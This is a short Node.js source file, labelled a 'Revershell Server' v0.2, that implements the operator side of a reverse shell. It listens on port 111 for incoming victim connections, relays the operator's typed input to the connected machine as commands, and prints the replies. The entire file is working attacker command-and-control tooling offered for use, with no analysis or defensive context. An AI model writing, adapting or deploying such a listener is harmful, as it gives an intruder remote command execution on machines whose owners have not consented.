const mngVersion = {
    'version' : 'v0.2',
    'description' : 'Server.js was established to connect the client.'
}

const net = require("net");
let server = new net.Server();
const Host = '0.0.0.0'; // Fixed
const Port = 111; //Listen 할 포트 입력


const serverOn = () => {
    setTimeout(() => {
        console.log(`:>>> Revershell Server ${mngVersion.version} <<<:`);
        console.log(`:>> Wait for a connection from the client side. <<:`);
        server.listen({ host: Host, port: Port }, () => {
            console.log(`ReverseSehll Server listen in ${Port}`);
        });
    }, 1000)
}

const serverCloseEventHandler = () => {
    console.log('connection closed')
}

const serverErrorEventHandler = (error) => {
    console.log("Address in use, retrying...", error);
    serverOn();
}

const serverConnectionEventHandler = (socket) => {
    console.log("new connection");

    //send a command
    process.stdin.on('data',function(send){
        socket.write(send);
    });

    socket.on("close", () => {
        console.log('socket closed')     
    });

    socket.on("end", () => {
        console.log(`Client ${socket} disconnected`);
        socket.destroy();
    }); 

    socket.on("data", (resp) => {
        console.log(`RESPONSE: ${resp}\n`)
    })
}

server.on("close", serverCloseEventHandler);
server.on("error", serverErrorEventHandler);
server.on("connection", serverConnectionEventHandler);

serverOn();
